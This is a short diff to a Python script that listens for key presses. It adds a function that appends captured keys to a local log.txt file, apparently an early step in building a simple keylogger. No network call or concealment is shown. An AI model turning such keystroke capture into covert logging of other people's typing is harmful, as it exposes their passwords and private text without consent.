@@ -11,6 +11,12 @@ def on_press(key):
     print("{0} pressed".format(key))
 
 
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(key)
+
+
 def on_release(key):
     if key == Key.esc:
         return False
